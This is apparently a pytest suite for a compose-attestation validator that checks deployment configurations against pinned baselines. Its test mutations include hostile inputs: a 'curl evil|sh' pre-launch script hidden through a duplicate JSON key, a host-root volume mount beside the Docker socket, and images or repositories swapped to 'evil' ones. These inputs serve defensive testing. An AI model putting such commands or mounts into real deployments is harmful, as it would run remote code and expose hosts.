"""Tests for attestation_rules.py. Run: python3 -m pytest -q scripts/"""

import hashlib
import importlib.util
import json
import pathlib
import re
import subprocess
import sys

import pytest

HERE = pathlib.Path(__file__).resolve().parent
REPO = HERE.parent
SCRIPT = HERE / "attestation_rules.py"
FIXTURES = REPO / "tests" / "fixtures" / "compose-history"
BASELINES = REPO / "opencode" / "attestation-baselines"

spec = importlib.util.spec_from_file_location("attestation_rules", SCRIPT)
rules = importlib.util.module_from_spec(spec)
sys.modules["attestation_rules"] = rules  # dataclasses need the module registered
spec.loader.exec_module(rules)


def raw(prefix):
    """The raw app_compose string of the fixture whose sha256 starts with prefix."""
    (path,) = FIXTURES.glob(f"{prefix}*.json")
    return json.loads(path.read_text())


def edit(prefix, fn):
    """Parse a fixture, let fn mutate the dict, and serialize it back."""
    obj = json.loads(raw(prefix))
    fn(obj)
    return json.dumps(obj)


def edit_file(prefix, fn):
    """Mutate the docker_compose_file text of a fixture."""
    def apply(obj):
        obj["docker_compose_file"] = fn(obj["docker_compose_file"])
    return edit(prefix, apply)


def replace_once(old, new):
    def fn(text):
        assert text.count(old) == 1, old
        return text.replace(old, new)
    return fn


# --- fixtures and baselines ---------------------------------------------

def test_compose_sha256_matches_file_name():
    paths = list(FIXTURES.glob("[0-9a-f]*.json"))
    assert len(paths) >= 9
    for p in paths:
        assert rules.compose_sha256(json.loads(p.read_text())) == p.stem


def test_validation_fixtures_are_present():
    for prefix in ["f571e5dafe8f", "53cd435edbc1", "1787a4af87ea", "ae66f844658a",
                   "e3902667a262", "edabf8039210", "e4b83d924284", "10d29b736472"]:
        assert raw(prefix)


def test_baseline_files_hash_to_their_names():
    paths = list(BASELINES.glob("*/*/*.json"))
    assert paths
    for p in paths:
        env, role = p.parent.parent.name, p.parent.name
        assert env in ("production", "staging") and role in ("gateway", "model")
        assert hashlib.sha256(p.read_bytes()).hexdigest() == p.stem


def test_baselines_are_pinned_in_their_environment():
    pins = {
        "production": REPO / "opencode" / "attestation-policy.json",
        "staging": REPO / "opencode" / "attestation-policy-staging.json",
    }
    for env, path in pins.items():
        pinned = {e["sha256"] for e in json.loads(path.read_text())["composeHashes"]}
        for role in ("gateway", "model"):
            for b in rules.load_baselines(BASELINES, env, role):
                assert rules.compose_sha256(b) in pinned


def test_load_baselines_reads_raw_bytes_sorted():
    got = rules.load_baselines(BASELINES, "production", "gateway")
    names = sorted(p.stem for p in (BASELINES / "production" / "gateway").glob("*.json"))
    assert [rules.compose_sha256(b) for b in got] == names
    assert rules.load_baselines(BASELINES, "production", "nonexistent-role") == []


@pytest.mark.parametrize("mutation", ["name=dstack-evil", "image tag :latest"])
def test_load_baselines_refuses_a_baseline_that_fails_c2_or_c3(tmp_path, mutation):
    # C2 and C3's pinning check only the candidate: merging a compose held on
    # them cannot clear the hold, so such a baseline is refused, not used.
    _, _, make, _ = MUTATIONS[mutation]
    bad = make()
    d = tmp_path / "production" / "gateway"
    d.mkdir(parents=True)
    (d / f"{rules.compose_sha256(bad)}.json").write_text(bad)
    with pytest.raises(ValueError, match="C2" if mutation.startswith("name") else "C3"):
        rules.load_baselines(tmp_path, "production", "gateway")
    r = subprocess.run([sys.executable, "-I", str(SCRIPT), "--environment", "production", "--role", "gateway",
                        "--baselines", str(tmp_path), str(d / f"{rules.compose_sha256(bad)}.json")],
                       capture_output=True, text=True)
    assert r.returncode not in (0, 3)


def test_load_baselines_refuses_an_unparseable_baseline(tmp_path):
    d = tmp_path / "production" / "model"
    d.mkdir(parents=True)
    (d / f"{rules.compose_sha256('[]')}.json").write_text("[]")
    with pytest.raises(ValueError, match="app_compose"):
        rules.load_baselines(tmp_path, "production", "model")


# --- the spec's validation table ----------------------------------------

@pytest.mark.parametrize("base,cand,role,passed,failures", [
    ("f571e5dafe8f", "53cd435edbc1", "gateway", False, ["C1", "C4", "G1"]),
    ("53cd435edbc1", "1787a4af87ea", "gateway", False, ["G1"]),
    ("1787a4af87ea", "d686bb1df6c0", "gateway", False, ["C1", "G1"]),
    ("ae66f844658a", "e3902667a262", "model",   False, ["C1", "C4", "M1"]),
    ("e3902667a262", "edabf8039210", "model",   True,  []),
])
def test_validation_table(base, cand, role, passed, failures):
    v = rules.evaluate(raw(cand), role, [raw(base)])
    assert (v.passed, sorted(v.failures)) == (passed, failures)
    assert v.closest == rules.compose_sha256(raw(base))
    if passed:
        assert v.match == "instance-label-v1"
        assert v.diff == []
    else:
        assert v.diff


def test_closest_is_the_baseline_with_fewest_failures():
    bases = [raw("f571e5dafe8f"), raw("53cd435edbc1")]
    v = rules.evaluate(raw("1787a4af87ea"), "gateway", bases)
    assert v.closest == rules.compose_sha256(raw("53cd435edbc1"))
    assert v.failures == ["G1"]


def test_a_pinned_compose_passes_exactly_against_itself():
    v = rules.evaluate(raw("1787a4af87ea"), "gateway", [raw("1787a4af87ea")])
    assert (v.passed, v.match, v.failures) == (True, "exact", [])


def test_no_baselines_holds():
    v = rules.evaluate(raw("1787a4af87ea"), "gateway", [])
    assert not v.passed and v.closest is None and v.failures


def test_unknown_role_is_an_error():
    with pytest.raises(ValueError):
        rules.evaluate(raw("1787a4af87ea"), "router", [raw("1787a4af87ea")])


def test_unparseable_candidate_holds():
    v = rules.evaluate("not json", "gateway", [raw("1787a4af87ea")])
    assert not v.passed and v.failures


# --- instance-label-v1 ---------------------------------------------------

LABEL = "      - INSTANCE_LABEL=gpu04\n"


def test_instance_label_pair_normalizes_equal():
    a = rules.instance_label_sha256(raw("e3902667a262"))
    assert a is not None
    assert a == rules.instance_label_sha256(raw("edabf8039210"))
    assert a != rules.compose_sha256(raw("e3902667a262"))


def test_normalized_form_replaces_only_the_label_value():
    norm = json.loads(rules.normalize_instance_label(raw("e3902667a262")))
    text = norm["docker_compose_file"]
    assert "      - INSTANCE_LABEL=*\n" in text
    assert "gpu04" not in text
    orig = json.loads(raw("e3902667a262"))["docker_compose_file"]
    assert text == orig.replace(LABEL, "      - INSTANCE_LABEL=*\n")


def test_second_uncommented_label_line_does_not_normalize():
    s = edit_file("e3902667a262", replace_once(LABEL, LABEL + "      - INSTANCE_LABEL=gpu05\n"))
    assert rules.normalize_instance_label(s) is None
    assert rules.instance_label_sha256(s) is None


def test_other_uncommented_line_mentioning_the_label_does_not_normalize():
    s = edit_file("e3902667a262", replace_once(LABEL, LABEL + "      - OTHER=$INSTANCE_LABEL\n"))
    assert rules.instance_label_sha256(s) is None


def test_commented_label_line_is_ignored():
    s = edit_file("e3902667a262", replace_once(LABEL, LABEL + "      # - INSTANCE_LABEL=gpu99\n"))
    # The extra comment changes the text, so compare against the same edit
    # made with a different label on the real line.
    t = edit_file("e3902667a262", replace_once(LABEL, "      - INSTANCE_LABEL=gpu02\n      # - INSTANCE_LABEL=gpu99\n"))
    assert rules.instance_label_sha256(s) is not None
    assert rules.instance_label_sha256(s) == rules.instance_label_sha256(t)


def test_64_char_label_normalizes_and_65_does_not():
    ok = edit_file("e3902667a262", replace_once(LABEL, f"      - INSTANCE_LABEL={'a' * 64}\n"))
    assert rules.instance_label_sha256(ok) == rules.instance_label_sha256(raw("e3902667a262"))
    long = edit_file("e3902667a262", replace_once(LABEL, f"      - INSTANCE_LABEL={'a' * 65}\n"))
    assert rules.instance_label_sha256(long) is None


def test_label_with_a_disallowed_character_does_not_normalize():
    for bad in ["gpu 04", "gpu/04", "gpü04", ""]:
        s = edit_file("e3902667a262", replace_once(LABEL, f"      - INSTANCE_LABEL={bad}\n"))
        assert rules.instance_label_sha256(s) is None, bad


def test_label_line_with_trailing_carriage_return_does_not_normalize():
    s = edit_file("e3902667a262", replace_once(LABEL, "      - INSTANCE_LABEL=gpu04\r\n"))
    assert rules.instance_label_sha256(s) is None


def test_no_label_line_does_not_normalize():
    s = edit_file("e3902667a262", replace_once(LABEL, ""))
    assert rules.instance_label_sha256(s) is None
    assert rules.instance_label_sha256(raw("1787a4af87ea")) is None


def test_non_object_or_missing_compose_file_does_not_normalize():
    assert rules.instance_label_sha256("[]") is None
    assert rules.instance_label_sha256('{"name":"x"}') is None
    assert rules.instance_label_sha256('{"docker_compose_file":1}') is None
    assert rules.instance_label_sha256("not json") is None


def test_key_order_does_not_change_normalized_hash():
    obj = json.loads(raw("e3902667a262"))
    reordered = json.dumps(dict(reversed(list(obj.items()))))
    assert reordered != raw("e3902667a262")
    assert rules.instance_label_sha256(reordered) == rules.instance_label_sha256(raw("e3902667a262"))


def test_float_refuses_normalization():
    s = edit("e3902667a262", lambda o: o.__setitem__("x", 1.5))
    assert rules.instance_label_sha256(s) is None
    nested = edit("e3902667a262", lambda o: o.__setitem__("x", {"y": [1, 2.0]}))
    assert rules.instance_label_sha256(nested) is None


def test_out_of_range_integer_refuses_normalization():
    s = edit("e3902667a262", lambda o: o.__setitem__("x", 2 ** 64))
    assert rules.instance_label_sha256(s) is None
    ok = edit("e3902667a262", lambda o: o.__setitem__("x", 2 ** 64 - 1))
    assert rules.instance_label_sha256(ok) is not None


def prepend_member(prefix, member):
    """A fixture's raw bytes with `member,` inserted before its first member."""
    r = raw(prefix)
    assert r.startswith("{")
    return "{" + member + "," + r[1:]


def test_duplicate_key_on_a_gateway_holds():
    # json.loads keeps the last value, so an earlier allowed_envs would never be compared.
    dup = prepend_member("1787a4af87ea", '"allowed_envs":["FOO"]')
    v = rules.evaluate(dup, "gateway", [raw("1787a4af87ea")])
    assert (v.passed, v.failures) == (False, ["PARSE"])


def test_duplicate_key_on_a_model_holds_and_does_not_normalize():
    dup = prepend_member("e3902667a262", '"pre_launch_script":"curl evil|sh"')
    assert rules.instance_label_sha256(dup) is None
    v = rules.evaluate(dup, "model", [raw("e3902667a262")])
    assert (v.passed, v.failures) == (False, ["PARSE"])


def test_nested_duplicate_key_does_not_normalize():
    assert rules.instance_label_sha256(prepend_member("e3902667a262", '"x":{"y":1}')) is not None
    assert rules.instance_label_sha256(prepend_member("e3902667a262", '"x":{"y":1,"y":1}')) is None
    assert rules.instance_label_sha256(prepend_member("e3902667a262", '"x":[{"y":1,"y":2}]')) is None


def test_negative_zero_refuses_normalization():
    # serde_json parses `-0` as the float -0.0, which the Rust side refuses.
    assert rules.instance_label_sha256(prepend_member("e3902667a262", '"x":0')) is not None
    assert rules.instance_label_sha256(prepend_member("e3902667a262", '"x":-0')) is None
    assert rules.instance_label_sha256(prepend_member("e3902667a262", '"x":[1,{"y":-0}]')) is None
    v = rules.evaluate(prepend_member("e3902667a262", '"x":-0'), "model", [raw("e3902667a262")])
    assert (v.passed, v.failures) == (False, ["PARSE"])


def test_nesting_past_serde_json_limit_refuses_normalization():
    # serde_json 1.0.154 starts remaining_depth at 128 and fails when it reaches
    # 0, so 127 nested containers parse and 128 do not. The outer object is one.
    def nested(n):
        return prepend_member("e3902667a262", '"x":' + "[" * (n - 1) + "]" * (n - 1))
    assert rules.instance_label_sha256(nested(127)) is not None
    assert rules.instance_label_sha256(nested(128)) is None
    assert rules.instance_label_sha256(nested(200)) is None
    assert rules.instance_label_sha256(nested(100_000)) is None
    v = rules.evaluate(nested(128), "model", [raw("e3902667a262")])
    assert (v.passed, v.failures) == (False, ["PARSE"])


def test_canonical_sorts_recursively_and_keeps_utf8():
    assert rules.canonical({"b": [{"d": 1, "c": True}], "a": "é", "z": None}) == \
        '{"a":"é","b":[{"c":true,"d":1}],"z":null}'
    with pytest.raises(ValueError):
        rules.canonical({"a": 1.0})


def test_shared_vector():
    v = json.loads((FIXTURES / "normalize-vector.json").read_text(encoding="utf-8"))
    assert '"note":"é"' in v["input"] or '"note": "é"' in v["input"]
    assert rules.instance_label_sha256(v["input"]) == v["normalized_sha256"]
    # The vector carries non-ASCII text and keys out of order, so it pins
    # sorting and UTF-8 output, not just the label substitution.
    keys = list(json.loads(v["input"]).keys())
    assert keys != sorted(keys)


# --- digest_blind --------------------------------------------------------

def test_digest_blind():
    d = "a" * 64
    assert rules.digest_blind(f"x@sha256:{d} y@sha256:{d}") == "x@sha256:* y@sha256:*"
    assert rules.digest_blind("x@sha256:abc") == "x@sha256:abc"


# --- one-field mutations -------------------------------------------------

GW, MODEL = "1787a4af87ea", "e3902667a262"
CLOUD_API = "nearaidev/cloud-api@sha256:d996bb08f36f0cc913ed7763f7c42bf4124e386a679e397a9acd8a3e69f3a704"
NEW_DIGEST = "0" * 64


def _mut_add_env(o):
    o["allowed_envs"] = o["allowed_envs"] + ["FOO"]


MUTATIONS = {
    "allowed_envs+FOO": (GW, "gateway", lambda: edit(GW, _mut_add_env), ["C1"]),
    "public_logs=true": (GW, "gateway", lambda: edit(GW, lambda o: o.__setitem__("public_logs", True)), ["C1"]),
    "pre_launch_script+echo": (MODEL, "model", lambda: edit(MODEL, lambda o: o.__setitem__(
        "pre_launch_script", o["pre_launch_script"] + "\necho pwned\n")), ["M1"]),
    "name=dstack-evil": (GW, "gateway", lambda: edit(GW, lambda o: o.__setitem__("name", "dstack-evil")), ["C2"]),
    "image tag :latest": (GW, "gateway", lambda: edit_file(GW, replace_once(CLOUD_API, "nearaidev/cloud-api:latest")), ["C3", "G1"]),
    "new repo evil/x@sha256:...": (GW, "gateway", lambda: edit_file(GW, replace_once(CLOUD_API, f"evil/x@sha256:{NEW_DIGEST}")), ["C4", "G1"]),
    "gateway: add volume line": (GW, "gateway", lambda: edit_file(GW, replace_once(
        "      - /var/run/docker.sock:/var/run/docker.sock:ro\n",
        "      - /var/run/docker.sock:/var/run/docker.sock:ro\n      - /:/host\n")), ["G1"]),
    "model: GITHUB_REPO changed": (MODEL, "model", lambda: edit_file(MODEL, replace_once(
        "GITHUB_REPO=https://github.com/nearai/cvm-compose-files",
        "GITHUB_REPO=https://github.com/evil/cvm-compose-files")), ["M1"]),
}


@pytest.mark.parametrize("mutation,rule", [
    ("allowed_envs+FOO", "C1"), ("public_logs=true", "C1"), ("pre_launch_script+echo", "M1"),
    ("name=dstack-evil", "C2"), ("image tag :latest", "C3"),
    ("new repo evil/x@sha256:...", "C4"),
    ("gateway: add volume line", "G1"), ("model: GITHUB_REPO changed", "M1"),
])
def test_one_field_mutation_holds(mutation, rule):
    base, role, make, expected = MUTATIONS[mutation]
    v = rules.evaluate(make(), role, [raw(base)])
    assert not v.passed
    assert rule in v.failures
    assert sorted(v.failures) == expected


def test_dstack_version_change_passes_c2():
    s = edit(GW, lambda o: o.__setitem__("name", "dstack-0.5.99"))
    v = rules.evaluate(s, "gateway", [raw(GW)])
    assert v.passed and v.match == "exact"


def test_interpolated_image_with_a_new_variable_holds_c3():
    s = edit_file(MODEL, replace_once("${COMPOSE_MANAGER_IMAGE:-", "${CM_IMAGE:-"))
    v = rules.evaluate(s, "model", [raw(MODEL)])
    assert "C3" in v.failures


def test_interpolated_image_without_a_digest_holds_c3():
    s = edit_file(MODEL, lambda t: re.sub(
        r"\$\{COMPOSE_MANAGER_IMAGE:-nearaidev/compose-manager@sha256:[0-9a-f]{64}\}",
        "${COMPOSE_MANAGER_IMAGE:-nearaidev/compose-manager:latest}", t))
    v = rules.evaluate(s, "model", [raw(MODEL)])
    assert "C3" in v.failures


def test_model_digest_change_passes_exact():
    s = edit_file(MODEL, lambda t: re.sub(
        r"(nearaidev/compose-manager@sha256:)[0-9a-f]{64}", r"\g<1>" + NEW_DIGEST, t))
    v = rules.evaluate(s, "model", [raw(MODEL)])
    assert (v.passed, v.match) == (True, "exact")


CM_DIGEST = "ae4332fdb0bfccf6410bc153a58d0b72a596a989cbb98fd5b6461fe32e079814"


def test_model_compose_manager_bump_in_pre_launch_script_passes_the_rules():
    # The launcher's re-pin names the compose-manager digest twice in
    # pre_launch_script. For a model, C1 leaves pre_launch_script to M1, which
    # compares it digest-blind; build_document's M2 pairs and verifies the
    # digests.
    def bump(o):
        assert o["pre_launch_script"].count(CM_DIGEST) == 2
        o["pre_launch_script"] = o["pre_launch_script"].replace(CM_DIGEST, NEW_DIGEST)
        o["docker_compose_file"] = o["docker_compose_file"].replace(CM_DIGEST, NEW_DIGEST)
    v = rules.evaluate(edit(MODEL, bump), "model", [raw(MODEL)])
    assert (v.passed, v.match, v.failures) == (True, "exact", [])


@pytest.mark.parametrize("value", [None, "absent"])
def test_model_pre_launch_script_null_or_absent_on_one_side_holds(value):
    def change(o):
        if value == "absent":
            del o["pre_launch_script"]
        else:
            o["pre_launch_script"] = value
    v = rules.evaluate(edit(MODEL, change), "model", [raw(MODEL)])
    assert not v.passed and "M1" in v.failures
    # Absent on one side and null on the other: M1 sees None both times, C1
    # still sees the key missing.
    nulled = edit(MODEL, lambda o: o.__setitem__("pre_launch_script", None))
    absent = edit(MODEL, lambda o: o.pop("pre_launch_script"))
    v = rules.evaluate(absent, "model", [nulled])
    assert not v.passed and "C1" in v.failures


def test_gateway_pre_launch_script_is_still_compared_exactly():
    script = "#!/bin/sh\necho nearaidev/compose-manager@sha256:{}\n"
    base = edit(GW, lambda o: o.__setitem__("pre_launch_script", script.format("1" * 64)))
    cand = edit(GW, lambda o: o.__setitem__("pre_launch_script", script.format("2" * 64)))
    v = rules.evaluate(cand, "gateway", [base])
    assert (v.passed, v.failures) == (False, ["C1"])


def test_digest_only_change_passes():
    s = edit_file(GW, replace_once(CLOUD_API, f"nearaidev/cloud-api@sha256:{NEW_DIGEST}"))
    v = rules.evaluate(s, "gateway", [raw(GW)])
    assert (v.passed, v.match, v.failures) == (True, "exact", [])


def test_digest_only_plus_allowed_env_holds():
    def both(o):
        o["docker_compose_file"] = replace_once(CLOUD_API, f"nearaidev/cloud-api@sha256:{NEW_DIGEST}")(o["docker_compose_file"])
        _mut_add_env(o)
    v = rules.evaluate(edit(GW, both), "gateway", [raw(GW)])
    assert (v.passed, v.failures) == (False, ["C1"])
    assert any("allowed_envs" in line for line in v.diff)


# --- CLI -----------------------------------------------------------------

def run_cli(tmp_path, compose, *args):
    p = tmp_path / "raw.json"
    p.write_text(json.dumps(compose))
    return subprocess.run([sys.executable, "-I", str(SCRIPT), *args, str(p)],
                          capture_output=True, text=True, cwd=tmp_path)


def test_cli_passes_with_exit_0(tmp_path):
    r = run_cli(tmp_path, raw("edabf8039210"), "--environment", "production", "--role", "model")
    assert r.returncode == 0, r.stderr
    out = json.loads(r.stdout)
    assert out["passed"] is True and out["match"] in ("exact", "instance-label-v1")


def test_cli_holds_with_exit_3(tmp_path):
    s = edit(GW, _mut_add_env)
    r = run_cli(tmp_path, s, "--environment", "production", "--role", "gateway")
    assert r.returncode == 3, r.stderr
    out = json.loads(r.stdout)
    assert out["passed"] is False and out["failures"] == ["C1"]
    assert out["closest"] == rules.compose_sha256(raw(GW))
